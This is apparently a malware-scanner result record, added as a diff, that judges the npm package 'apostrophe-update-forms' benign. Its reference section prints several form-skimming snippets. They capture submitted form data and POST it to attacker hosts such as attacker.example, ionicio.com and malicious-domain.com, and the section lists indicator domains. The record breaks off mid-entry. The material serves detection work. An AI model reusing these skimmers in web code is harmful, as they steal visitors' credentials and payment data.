@@ -1,0 +1,516 @@
+{
+  "package_name": "apostrophe-update-forms",
+  "package_version": "0.5.8",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:54:09.626107",
+  "status": "success",
+  "selected_files_count": 4,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/public/js/content.js",
+    "package/public/js/editor.js"
+  ],
+  "is_malicious": false,
+  "total_files": 4,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/apostrophe-update-forms/0.5.8/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/apostrophe-update-forms/0.5.8/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "/* jshint node:true */\n\nvar _ = require('lodash');\nvar async = require('async');\nvar csv = require('csv-stringify');\nvar qs = require('qs');\n\nmodule.exports = updateForms;\n\nfunction updateForms(options, callback) {\n  return new updateForms.UpdateForms(options, callback);\n}\n\nvar snippets = require('apostrophe-snippets');\n\nupdateForms.UpdateForms = function(options, callback) {\n  var self = this;\n  self._pages = options.pages;\n  self._apos = options.apos;\n  self._schemas = options.schemas;\n\n  // bodyControls, addBodyControls, removeBodyControls are supported\n  // (if you use the first one, the other two are ignored)\n  resolveControls('body');\n\n  // Same idea\n  resolveControls('thanks');\n\n  // Too much potential for havoc\n  options.adminOnly = true;\n\n  options.addFields = [\n    {\n      name: 'body',\n      label: 'Instructions',\n      type: 'area',\n      options: {\n        controls: options.bodyControls\n      }\n    },\n    {\n      name: 'thanks',\n      label: 'Thank You Message',\n      type: 'area',\n      options: {\n        controls: options.thanksControls\n      }\n    }\n  ].concat([ getTypeSelectorField() ])\n  .concat(getTypeFields());\n\n  options.removeFields = [ 'hideTitle', 'thumbnail' ].concat(options.removeFields || []);\n\n  _.defaults(options, {\n    name: 'updateForms',\n    label: 'Update Forms',\n    instance: 'updateForm',\n    instanceLabel: 'Update Form',\n    menuName: 'aposUpdateFormsMenu',\n  });\n\n  options.modules = (options.modules || []).concat([ { dir: __dirname, name: 'update-forms' } ]);\n\n  snippets.Snippets.call(this, options, null);\n  self._apos.mixinModuleEmail(self);\n\n  self._app.get(self._action + '/mail-merge', function(req, res) {\n\n    var baseUrl = req.protocol + '://' + req.get('Host') + self._apos.prefix;\n\n    var form;\n    var objects;\n    var mergeKeys = {};\n    var joinType;\n    var typeOptions;\n    var mailMerge;\n    var fieldDefinition;\n\n    return async.series([ getForm, getObjects, getPeople, setMergeKeys ], function(err) {\n      if (err) {\n        console.error(err);\n        res.statusCode = 404;\n        return res.send('not found');\n      }\n      var data = [];\n      data.push(self.getMailMergeHeadings());\n      _.each(objects, function(object) {\n        if (!_.has(mergeKeys, object._id)) {\n          return;\n        }\n        data.push(self.getMailMergeRow(object, baseUrl, mergeKeys ));\n      });\n      res.attachment('mail-merge.csv');\n      return csv(data, function(err, s) {\n        if (err) {\n          console.error(err);\n          res.statusCode = 404;\n          return res.send('not found');\n        }\n        return res.send(s);\n      });\n    });\n\n    function getForm(callback) {\n      return self.getOne(req, { _id: self._apos.sanitizeId(req.query.id) }, { editable: true }, function(err, _form) {\n        if (err) {\n          return callback(err);\n        }\n        form = _form;\n        typeOptions = options.types[form.snippetType];\n        mailMerge = typeOptions.mailMerge || {};\n\n        if (mailMerge.getPeople) {\n          joinType = 'joinByGetPeople';\n        } else if (mailMerge.personField) {\n          joinType = 'joinByPersonField';\n        } else if (mailMerge.field) {\n          joinType = 'joinByOne';\n        } else {\n          joinType = 'joinByPermissions';\n        }\n\n        if (joinType === 'joinByOne') {\n          fieldDefinition = _.find(manager.schema, { name: mailMerge.field });\n          if ((!fieldDefinition) || (fieldDefinition.type !== 'joinByOne')) {\n            return callback('field option used, personField option not used, and field option is not joinByOne');\n          }\n        }\n        return callback(null);\n      });\n    }\n\n    function getObjects(callback) {\n      var fields = { title: 1, pagePermissions: 1 };\n      if (joinType === 'joinByPersonField') {\n        fields[mailMerge.field] = 1;\n      } else if (joinType === 'joinByOne') {\n        fields[fieldDefinition.idField] = 1;\n      }\n      return self._pages.getManager(form.snippetType).get(req, {}, { published: null, fields: fields, withJoins: false, areas: false }, function(err, results) {\n        if (err) {\n          return callback(err);\n        }\n        objects = results.pages || results.snippets;\n        return callback(null);\n      });\n    }\n\n    function getPeople(callback) {\n\n      if (joinType === 'joinByGetPeople') {\n        return mailMerge.getPeople(req, objects, callback);\n      }\n\n      var criteria = {};\n      var manager = self._pages.getManager(form.snippetType);\n      if (!typeOptions) {\n        return callback('type no longer configured');\n      }\n\n      var fields = { firstName: 1, lastName: 1, email: 1, title: 1 };\n      if (joinType === 'joinByPersonField') {\n        fields[mailMerge.personField] = 1;\n      }\n\n      if (joinType === 'joinByPermissions') {\n        criteria = { _id: { $in: [] } };\n        _.each(objects, function(object) {\n          _.each(object.pagePermissions || [], function(p) {\n            var matches = p.split(/\\-/);\n            if (!(matches && (matches[0] === 'edit') && matches[1])) {\n              return;\n            }\n            criteria._id.$in.push(matches[1]);\n          });\n        });\n      } else if (joinType === 'joinByPersonField') {\n        var personFieldValues = _.pluck(objects, mailMerge.field);\n        criteria = {};\n        criteria[mailMerge.personField] = { $in: personFieldValues };\n      } else if (joinType === 'joinByOne') {\n        var personIds = _.pluck(objects, fieldDefinition.idField);\n        criteria = { _id: { $in: personIds } };\n      }\n\n      return self._pages.getManager('person').get(req, criteria, { published: null, fields: fields, withJoins: false, areas: false }, function(err, results) {\n        if (err) {\n          return callback(err);\n        }\n\n        var people = results.snippets;\n\n        if (joinType === 'joinByPermissions') {\n          var peopleById = _.indexBy(people, '_id');\n          _.each(objects, function(object) {\n            _.each(object.pagePermissions || [], function(permission) {\n              var matches = permission.split(/\\-/);\n              if (matches && matches[1] && _.has(peopleById, matches[1])) {\n                object._person = peopleById[matches[1]];\n                return false;\n              }\n            });\n          });\n        } else if (joinType === 'joinByPersonField') {\n          var peopleByField = _.indexBy(people, mailMerge.personField);\n          _.each(objects, function(object) {\n            if (_.has(peopleByField, object[mailMerge.field])) {\n              object._person = peopleByField[object[mailMerge.field]];\n            }\n          });\n        } else if (joinType === 'joinByOne') {\n          var peopleById = _.indexBy(people, '_id');\n          _.each(objects, function(object) {\n            if (_.has(peopleById[object[fieldDefinition.idField]])) {\n              object._person = peopleById[object[fieldDefinition.idField]];\n            }\n          });\n        }\n\n        return callback(null);\n      });\n    }\n\n    function setMergeKeys(callback) {\n      var interesting = _.filter(objects, function(object) {\n        return object._person;\n      });\n      return async.eachLimit(interesting, 4, function(object, callback) {\n        var mergeKey = form._id + ',' + object._id + ',' + object._person._id + ',' + self._apos.generateId();\n        mergeKeys[object._id] = mergeKey;\n        return self._apos.pages.update(\n          { _id: object._person._id },\n          { $push: { updateFormsMergeKeys: mergeKey } },\n          callback\n        );\n      }, callback);\n    }\n\n  });\n\n  // One route to both display and save the form, since they have\n  // so many shared prerequisites\n\n  self._app.all(self._action + '/complete-form', function(req, res) {\n    var mergeKey = self._apos.sanitizeString(req.query.mergeKey);\n    var formId, objectId, personId, passcode;\n    var parts = mergeKey.split(/,/);\n    formId = parts[0];\n    objectId = parts[1];\n    personId = parts[2];\n    passcode = parts[3];\n    var originalSlug;\n    var person, form, object, schema;\n    // Make sure we get schema related js in browser\n    req.scene = 'user';\n    return async.series([ getPerson, getForm, getObject ], function(err) {\n      if (err) {\n        console.error(err);\n        return res.send(self.renderPage(req, 'notfound', {}));\n      } else {\n        schema = flattenFormFields();\n        if (req.method === 'GET') {\n          return sendForm();\n        } else {\n          return saveForm();\n        }\n      }\n    });\n\n    function getPerson(callback) {\n      return self._pages.getManager('person').getOne(req, { _id: personId }, { published: null, permissions: false }, function(err, _person) {\n        if (err) {\n          return callback(err);\n        }\n        if (!_person) {\n          return callback('notfound');\n        }\n        if (!_.contains(_person.updateFormsMergeKeys, mergeKey)) {\n          return callback('unauthorized');\n        }\n        person = _person;\n        return callback(null);\n      });\n    }\n\n    function getForm(callback) {\n      return self.getOne(req, { _id: formId }, { permissions: false, published: true }, function(err, _form) {\n        if (err) {\n          return callback(err);\n        }\n        if (!_form) {\n          return callback('not found');\n        }\n        form = _form;\n        return callback(null);\n      });\n    }\n\n    function getObject(callback) {\n      return self._pages.getManager(form.snippetType).getOne(req, { _id: objectId }, { permissions: false }, function(err, _object) {\n        if (err) {\n          return callback(err);\n        }\n        if (!_object) {\n          return callback('not found');\n        }\n        object = _object;\n        originalSlug = object.slug;\n        return callback(null);\n      });\n    }\n\n    function flattenFormFields() {\n      var schema = [];\n      var originalSchema = self._pages.getManager(form.snippetType).schema;\n      var groupNames = _.map(\n        _.filter(\n          originalSchema, { type: 'group' }\n        ),\n        function(group) {\n          return group.name;\n        }\n      );\n      var groupFieldListNames = _.map(groupNames, function(groupName) {\n        return form.snippetType + groupName + 'Fields';\n      });\n      var fieldNames = [];\n      _.each(groupFieldListNames, function(name) {\n        fieldNames = fieldNames.concat(form[name]);\n      });\n      // We actually do want a flat schema, so don't use subset\n      var flattenedSchema = _.map(fieldNames, function(name) {\n        return _.find(originalSchema, { name: name });\n      });\n      // TODO One of the fields in this schema was returning undefined upon\n      // flattening. This could be caused by some other issue, but omitting\n      // that field seems to stop the bleeding. - Jimmy & Austin\n      return _.filter(flattenedSchema, function(item) { return !!item; });\n    }\n\n    function sendForm() {\n      return res.send(self.renderPage(\n        req,\n        'completeForm',\n        {\n          person: person,\n          object: _.pick(object, _.pluck(schema, 'name'), 'title'),\n          schema: schema,\n          mergeKey: mergeKey,\n          form: form,\n          bodyOptions: _.find(self.schema, { name: 'body' }).options,\n          thanksOptions: _.find(self.schema, { name: 'thanks' }).options\n        }\n      ));\n    }\n\n    function saveForm() {\n\n      return async.series([ sanitize, save ], function(err) {\n        if (err) {\n          return res.send({ status: 'error' });\n        } else {\n          return res.send({ status: 'ok' });\n        }\n      });\n\n      function sanitize(callback) {\n        return self._schemas.convertFields(req, schema, 'form', req.body, object, callback);\n      }\n\n      function save(callback) {\n        return self.saveForm(form.snippetType, req, originalSlug, object, callback);\n      }\n\n    }\n\n  });\n\n  function getTypeSelectorField() {\n    var typeNames = _.keys(options.types);\n    var choices = [\n      {\n        label: 'CHOOSE ONE',\n        value: ''\n      }\n    ].concat(\n      _.map(typeNames, function(typeName) {\n        var manager = self._pages.getManager(typeName);\n        var schema = getSubset(typeName);\n        var groups = _.filter(schema, { type: 'group' });\n        var groupNames = _.pluck(groups, 'name');\n        var showFields = _.map(groupNames, function(groupName) {\n          return typeName + groupName + 'Fields';\n        });\n        return {\n          value: typeName,\n          label: manager.instanceLabel,\n          showFields: showFields\n        };\n      })\n    );\n    return {\n      type: 'select',\n      name: 'snippetType',\n      label: 'Content Type',\n      required: true,\n      choices: choices\n    };\n  }\n\n  function getTypeFields() {\n    var fields = [];\n    var typeNames = _.keys(options.types);\n    _.each(typeNames, function(typeName) {\n      var schema = getSubset(typeName);\n      var groups = _.filter(schema, { type: 'group' });\n      var fieldsByGroup = {};\n      _.each(groups, function(group) {\n        fieldsByGroup[group.name] = _.filter(schema, { group: group.name });\n      });\n\n      _.each(groups, function(group) {\n        fields.push({\n          type: 'checkboxes',\n          label: group.label,\n          name: typeName + group.name + 'Fields',\n          choices: _.map(fieldsByGroup[group.name] || [], function(field) {\n            return {\n              label: field.label,\n              value: field.name\n            }\n          })\n        });\n      });\n    });\n    return fields;\n  }\n\n  function resolveControls(areaName) {\n    var add = 'add' + self._apos.capitalizeFirst(areaName) + 'Controls';\n    var remove = 'remove' + self._apos.capitalizeFirst(areaName) + 'Controls';\n    var controls = areaName + 'Controls';\n    if (options[controls]) {\n      return;\n    }\n    options[add] = [\n      'style', 'bold', 'italic', 'createLink', 'unlink', 'insertUnorderedList', 'insertTable', 'slideshow', 'video'\n    ].concat(options[add] || []);\n    options[controls] = _.filter(options[add], function(name) {\n      return !_.contains(options[remove] || [], name);\n    });\n  };\n\n  function getSubset(typeName) {\n    var schema = self._pages.getManager(typeName).schema;\n    if (!schema) {\n      throw new Error(\"No schema for \" + typeName);\n    }\n    var config = options.types[typeName];\n    var allowedFields = _.pluck(schema, 'name');\n    if (config.allowedFields) {\n      allowedFields = config.allowedFields;\n    }\n    if (config.allowedField) {\n      allowedFields = _.filter(allowedFields, function(name) {\n        return config.allowedField(_.find(schema, { name: name }));\n      });\n    }\n    return self._schemas.subset(schema, allowedFields);\n  }\n\n  // Override me if you need special considerations when actually storing the updated object\n  self.saveForm = function(type, req, slug, object, callback) {\n    return self._pages.getManager(type).putOne(req, slug, { permissions: false }, object, callback);\n  };\n\n  self.getMailMergeHeadings = function() {\n    return [ 'First Name', 'Last Name', 'Full Name', 'Email', 'Content', 'URL' ];\n  };\n\n  self.getMailMergeRow = function(object, baseUrl, mergeKeys) {\n    return [\n      object._person.firstName,\n      object._person.lastName,\n      object._person.title,\n      object._person.email,\n      object.title,\n      baseUrl + self._action + '/complete-form?' + qs.stringify({\n        mergeKey: mergeKeys[object._id]\n      })\n    ];\n  };\n\n  if (callback) {\n    process.nextTick(_.partial(callback, null));\n  }\n\n};",
+          "is_malicious": false,
+          "malice_score": 0.468447873989741,
+          "confidence": 0.1,
+          "behavior_summary": "Upon receiving HTTP requests at the '/mail-merge' and '/complete-form' endpoints, the code accesses and modifies data via database managers to retrieve forms, associated objects, and person records, constructs unique merge keys, and generates CSV data for mail merge purposes. It uses sensitive APIs including HTTP request handling, database queries, and CSV generation, and constructs URLs embedding merge keys for form completion. This enables controlled data exfiltration of personal and form data via CSV download and facilitates authenticated form submission, potentially impacting data confidentiality and integrity if merge keys are compromised.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code implements a controlled form update and mail merge system within a CMS-like environment. It handles HTTP requests to generate CSV exports of merged data and to allow authenticated form completion via unique merge keys. While it accesses sensitive data and constructs URLs embedding merge keys, this behavior is consistent with legitimate application functionality for managing user-submitted forms and data updates. There is no evidence of obfuscation, unauthorized data exfiltration to attacker-controlled domains, or interception of form submissions for malicious purposes. The known malicious patterns involve client-side formjacking with event listeners and exfiltration to external attacker domains, which is not present here. The code uses server-side APIs and database managers in a transparent manner, with explicit permission checks and controlled data flows. Therefore, despite handling sensitive data, the code does not exhibit malicious intent or behavior.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_132333_395634_snippet_3",
+              "source_package": "polyfill.io (CDN service) (CDN (not a package manager, but a third-party JavaScript CDN service))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_132333_395634/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4822179079055786,
+              "code_similarity": 0.35195213556289673,
+              "behavior_similarity": 0.6124836802482605,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Potential for formjacking (not yet observed, but possible):\n// document.querySelector('form').addEventListener('submit', function(e) {\n//   var data = new FormData(e.target);\n//   fetch('https://attacker.example/collect', { method: 'POST', body: data });\n// });",
+                "code_behavior": "At runtime, the code could attach event listeners to form submissions, intercept submitted form data, and exfiltrate it to an attacker-controlled endpoint via network requests, resulting in potential theft of user credentials or sensitive information.",
+                "malice_analysis": {
+                  "why_suspicious": "Intercepting and exfiltrating form data is a hallmark of formjacking attacks. This behavior is highly suspicious and never expected from a polyfill service, as it directly compromises user privacy and security.",
+                  "violated_expectations": "Polyfill scripts should not interact with user input, monitor form submissions, or exfiltrate data to external endpoints.",
+                  "similar_legitimate_use": "Legitimate form analytics or error tracking may collect form data, but only with explicit user consent and transmission to trusted, well-known domains. They do not operate covertly or send data to attacker-controlled infrastructure.",
+                  "key_indicators": [
+                    "Form event interception via addEventListener on form elements",
+                    "Network exfiltration of user-submitted data to untrusted endpoints",
+                    "Use of attacker-controlled domains for data collection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "At runtime, when a user visits a website that includes cdn.polyfill.io.",
+                  "file_location": "Dynamically served JavaScript from cdn.polyfill.io.",
+                  "required_permissions": [
+                    "network",
+                    "DOM access",
+                    "potentially access to form data"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "polyfill.io (CDN service)",
+                  "package_manager": "CDN (not a package manager, but a third-party JavaScript CDN service)",
+                  "package_versions": "All versions served after February 2024 (post-acquisition by Funnull)",
+                  "why_malicious": "After its acquisition by Funnull in February 2024, the polyfill.io CDN service began serving malicious, obfuscated JavaScript payloads. These payloads inject unwanted redirects, selectively target mobile users, evade detection through delayed execution and environment checks, and can potentially exfiltrate user data. The code is dynamically generated and adapts its behavior, turning every website that includes cdn.polyfill.io into a potential supply chain attack vector."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "A website includes a script tag referencing cdn.polyfill.io, causing the browser to load and execute the malicious JavaScript payload.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious code executes in the user's browser environment."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious JavaScript checks for mobile devices, admin or analytics presence, and delays execution to evade detection.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Selective targeting of victims and evasion of security tools or manual analysis."
+                  },
+                  {
+                    "step": 3,
+                    "action": "If targeting conditions are met, the code injects a script from a typo-squatted analytics domain or performs redirects to malicious sites.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is redirected to attacker-controlled content or further malicious payloads are loaded."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Potential for further attacks such as formjacking or data exfiltration if the payload evolves or is updated.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Possible theft of user data, credentials, or sensitive information."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated JavaScript payloads served from cdn.polyfill.io",
+                    "Dynamic script injection from typo-squatted analytics domains (e.g., www.googie-anaiytics.com)",
+                    "Conditional logic based on user agent, admin or analytics presence",
+                    "Delayed execution using setTimeout before performing malicious actions",
+                    "Unexpected redirects to non-legitimate or attacker-controlled domains",
+                    "Potential interception and exfiltration of form data"
+                  ],
+                  "file_indicators": [
+                    "<script src=\"https://cdn.polyfill.io/v3/polyfill.min.js\">",
+                    "References to https://www.googie-anaiytics.com/gtags.js in dynamically injected scripts",
+                    "Obfuscated inline JavaScript with dynamic script injection logic"
+                  ],
+                  "network_indicators": [
+                    "Outbound requests to www.googie-anaiytics.com",
+                    "Redirects to domains associated with sports betting, pornography, or other malicious content",
+                    "Potential future exfiltration to attacker-controlled endpoints (e.g., https://attacker.example/collect)"
+                  ],
+                  "how_to_detect": "Scan website source code and network traffic for references to cdn.polyfill.io and typo-squatted analytics domains such as www.googie-anaiytics.com. Monitor for obfuscated JavaScript payloads that perform delayed execution, dynamic script injection, or conditional redirects. Use web application firewalls and browser security tools to block or alert on unexpected script sources and outbound requests to known malicious domains. Regularly audit third-party scripts and replace cdn.polyfill.io with trusted alternatives. Monitor for suspicious form data exfiltration to untrusted endpoints."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_132336_580881_snippet_1",
+              "source_package": "icon-package (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_132336_580881/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.466203510761261,
+              "code_similarity": 0.39011067152023315,
+              "behavior_similarity": 0.5422963500022888,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Obfuscated code (deobfuscated for clarity)\nconst forms = document.querySelectorAll('form');\nforms.forEach(form => {\n  form.addEventListener('submit', function(event) {\n    const formData = new FormData(form);\n    fetch('https://ionicio.com/collect', {\n      method: 'POST',\n      body: formData\n    });\n  });\n});",
+                "code_behavior": "At runtime, the code attaches 'submit' event listeners to all form elements in the DOM, collects the submitted form data, and sends it via HTTPS POST to a hardcoded attacker-controlled domain (ionicio.com), resulting in exfiltration of sensitive user input.",
+                "malice_analysis": {
+                  "why_suspicious": "The code intercepts all form submissions and exfiltrates user-provided data to an external, attacker-controlled domain without user consent or legitimate purpose. This behavior is highly indicative of credential theft or data harvesting.",
+                  "violated_expectations": "A legitimate icon package should only provide static assets or rendering logic for icons and should not interact with the DOM, attach event listeners to forms, or perform network requests on form submissions.",
+                  "similar_legitimate_use": "Legitimate analytics or form-handling libraries may collect form data, but only with explicit user consent and send it to trusted, well-known domains. They do not use obfuscated code or target unrelated domains, especially those mimicking legitimate package names.",
+                  "key_indicators": [
+                    "Obfuscated JavaScript code targeting all form elements in the DOM",
+                    "Attaches 'submit' event listeners to every form on the page",
+                    "Collects form data using FormData API",
+                    "Sends HTTPS POST requests to a hardcoded, attacker-controlled domain (ionicio.com) that is a typosquat of the legitimate vendor",
+                    "No legitimate reason for an icon package to access or exfiltrate form data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when loaded in the browser)",
+                  "file_location": "main package JavaScript file (e.g., index.js or distributed bundle)",
+                  "required_permissions": [
+                    "network access",
+                    "DOM access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "icon-package",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all published versions considered malicious)",
+                  "why_malicious": "The package is a typosquat of the legitimate 'ionicons' package and contains obfuscated JavaScript code that exfiltrates end-user form data to attacker-controlled domains. Its sole purpose is to deceive developers into installing it and to steal sensitive user information from applications that include it, violating user privacy and application security."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Developer installs the malicious package (icon-package) instead of the legitimate one due to typosquatting.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is included in the application bundle."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When the application runs in a user's browser, the malicious code executes and attaches 'submit' event listeners to all form elements in the DOM.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Form submissions are intercepted by the malicious code."
+                  },
+                  {
+                    "step": 3,
+                    "action": "On form submission, the code collects all form data and sends it via HTTPS POST to the attacker's domain (ionicio.com).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exfiltration of sensitive user data to the attacker-controlled infrastructure."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript code in UI or icon packages that attaches 'submit' event listeners to all form elements in the DOM",
+                    "Obfuscated code that interacts with the DOM and collects form data using the FormData API",
+                    "Network requests to domains that are typosquats of legitimate package vendor domains (e.g., ionicio.com vs ionic.io)"
+                  ],
+                  "file_indicators": [
+                    "index.js or main bundle containing obfuscated code with references to 'form', 'addEventListener', 'FormData', and 'fetch' or 'XMLHttpRequest'",
+                    "References to external domains not associated with the legitimate package, especially those resembling the legitimate vendor's domain"
+                  ],
+                  "network_indicators": [
+                    "HTTPS POST requests to ionicio.com/collect or other attacker-controlled domains (e.g., graph-googleapis.com, curls.safhosting.xyz, arpanrizki.my.id, dnster.my.id, okep.renznesia.xyz, ryucha.my.id, panelllgege.001www.com, nge.scrp.my.id, apiii-xyz.yogax.my.id, panel.archodex.xyz, panel.curlz.online)"
+                  ],
+                  "how_to_detect": "Monitor for JavaScript packages, especially those with names similar to popular libraries, that contain obfuscated code accessing the DOM and sending form data to external domains. Flag any network requests from UI or icon packages to domains not associated with the legitimate vendor, particularly those with typosquatted names. Use static analysis to detect code that attaches event listeners to forms and dynamic analysis to observe exfiltration of form data to suspicious domains."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133738_541787_snippet_1",
+              "source_package": "icon-package (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133738_541787/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4610641896724701,
+              "code_similarity": 0.3807237148284912,
+              "behavior_similarity": 0.541404664516449,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Obfuscated example (deobfuscated for clarity)\ndocument.querySelectorAll('form').forEach(form => {\n  form.addEventListener('submit', function(event) {\n    const formData = new FormData(form);\n    fetch('https://ionicio.com/collect', {\n      method: 'POST',\n      body: formData\n    });\n  });\n});",
+                "code_behavior": "At runtime, the code attaches 'submit' event listeners to all form elements in the DOM, collects the submitted form data, and sends it via HTTPS POST to a hardcoded attacker-controlled domain (ionicio.com), resulting in exfiltration of user-entered data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code intercepts all form submissions and exfiltrates the complete form data to an external, attacker-controlled domain without user consent or notification. This is a classic data theft technique and is highly suspicious, especially in a package that should only provide UI icons.",
+                  "violated_expectations": "Legitimate UI icon packages are expected to provide static assets or UI components and should not access, intercept, or transmit user form data. The presence of code that manipulates form submissions and sends data to unrelated domains is a clear violation of expected package behavior.",
+                  "similar_legitimate_use": "Legitimate applications may send form data to their own backend servers for processing, but never to unrelated or suspicious external domains, and never from a package whose purpose is unrelated to data handling.",
+                  "key_indicators": [
+                    "Attaches event listeners to all form elements in the DOM",
+                    "Collects and serializes form data on submission",
+                    "Sends form data to a hardcoded, attacker-controlled domain (e.g., ionicio.com)",
+                    "Obfuscated or minified code to conceal intent",
+                    "No user notification or consent for data transmission",
+                    "Behavior present in a package claiming to be a UI/icon library"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (in-browser execution when user interacts with forms)",
+                  "file_location": "main JavaScript bundle included in the application via the malicious npm package",
+                  "required_permissions": [
+                    "network",
+                    "DOM access"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "icon-package",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all published versions considered malicious)",
+                  "why_malicious": "The package is a typosquatting attack designed to impersonate the legitimate 'ionicons' package. It contains obfuscated JavaScript that, when included in a web application, intercepts user form submissions and exfiltrates sensitive data (such as credentials and personally identifiable information) to attacker-controlled domains. This behavior is entirely unrelated to the expected functionality of an icon/UI library and constitutes a severe data theft risk."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Developer installs the malicious npm package (icon-package) due to typosquatting, mistaking it for the legitimate 'ionicons' package.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is included in the application's dependency tree."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Application is built and deployed with the malicious package; end-users load the application in their browsers.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious JavaScript is executed in the end-user's browser environment."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code attaches 'submit' event listeners to all forms and intercepts form submissions.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Form data is captured at the point of user submission."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Captured form data is exfiltrated to attacker-controlled domains (e.g., ionicio.com) via HTTPS POST requests.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive user data (credentials, PII, etc.)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "JavaScript code in UI/icon packages that attaches event listeners to all forms and sends form data to external domains",
+                    "Obfuscated or minified code containing network requests to suspicious or non-canonical domains",
+                    "Unexpected network activity originating from packages whose primary function is to provide static assets or UI components"
+                  ],
+                  "file_indicators": [
+                    "Presence of obfuscated JavaScript in packages claiming to be UI/icon libraries",
+                    "References to external domains (e.g., ionicio.com, graph-googleapis.com) in package source code or bundled assets"
+                  ],
+                  "network_indicators": [
+                    "ionicio.com",
+                    "graph-googleapis.com",
+                    "curls.safhosting.xyz",
+                    "arpanrizki.my.id",
+                    "dnster.my.id",
+                    "okep.renznesia.xyz",
+                    "ryucha.my.id",
+                    "panelllgege.001www.com",
+                    "nge.scrp.my.id",
+                    "apiii-xyz.yogax.my.id",
+                    "panel.archodex.xyz",
+                    "panel.curlz.online"
+                  ],
+                  "how_to_detect": "Monitor npm packages, especially those purporting to be UI/icon libraries, for the presence of obfuscated JavaScript that makes network requests to domains not associated with the legitimate package. Flag any code that attaches event listeners to all forms and sends form data to external, non-canonical domains. Use network monitoring to detect exfiltration attempts to the listed IOC domains. Automated static analysis should look for suspicious domain references and event listener patterns in package code."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113714_948198_snippet_1",
+              "source_package": "Injected JavaScript Magecart skimmer (Warner Music Group online store) (N/A (injected client-side JavaScript, not a package manager ecosystem))",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113714_948198/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.45594221353530884,
+              "code_similarity": 0.3101001977920532,
+              "behavior_similarity": 0.6017842292785645,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Magecart-style data skimmer (representative example)\ndocument.addEventListener('submit', function(e) {\n  var form = e.target;\n  var data = new FormData(form);\n  fetch('https://malicious-domain.com/collect', {\n    method: 'POST',\n    body: data\n  });\n});",
+                "code_behavior": "At runtime, when a user submits a form, the code hooks into the form submission event, collects all form data (including payment and personal information), and sends this data via HTTPS POST to a hardcoded attacker-controlled domain, resulting in exfiltration of sensitive customer information.",
+                "malice_analysis": {
+                  "why_suspicious": "The code intercepts all form submissions and exfiltrates the complete form data to an external, non-legitimate domain, which is a hallmark of Magecart-style web skimming attacks. The use of a hardcoded, untrusted endpoint for data exfiltration is highly indicative of malicious intent.",
+                  "violated_expectations": "Legitimate e-commerce JavaScript should never transmit sensitive checkout or payment form data to unknown or undocumented third-party domains. All data handling should be restricted to trusted payment processors or the store's own backend, and code should not be injected or obfuscated.",
